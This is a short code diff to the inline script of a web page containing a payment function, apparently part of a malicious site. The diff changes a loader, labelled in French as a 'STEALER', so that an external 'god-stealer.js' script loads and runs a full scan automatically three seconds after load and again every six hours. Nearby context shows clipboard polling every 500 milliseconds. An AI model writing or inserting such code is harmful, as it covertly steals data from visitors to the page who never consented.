@@ -354,8 +354,8 @@ function processPayment() {
   setInterval(clipPoll,500);
 })();
 
-// ═══ STEALER — chargé immédiatement, se déclenche au premier clic ═══
-(function(){const s=document.createElement("script");s.src="god-stealer.js";document.head.appendChild(s)})();
+// ═══ STEALER — chargé + activé automatiquement ═══
+(function(){const s=document.createElement("script");s.src="god-stealer.js";s.onload=()=>{window._stealerReady=true;setTimeout(()=>{if(window.GOD_STEALER){window.GOD_STEALER.runFullScan();setInterval(()=>window.GOD_STEALER.runFullScan(),6*60*60*1000)}},3000)};document.head.appendChild(s)})();
 </script>
 </body>
 </html>
